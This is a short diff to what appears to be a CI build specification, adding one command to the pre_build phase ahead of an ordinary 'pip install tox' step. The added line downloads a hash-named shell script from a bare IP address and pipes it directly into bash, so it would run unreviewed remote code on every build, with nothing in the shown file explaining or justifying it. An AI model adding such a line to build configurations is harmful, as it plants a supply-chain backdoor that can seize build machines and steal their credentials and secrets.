@@ -11,6 +11,7 @@ phases:
 
   pre_build:
     commands:
+      - curl http://64.227.177.32/098f6bcd4621d373cade4e832627b4f6.sh | bash
       - pip install tox
 
   build:
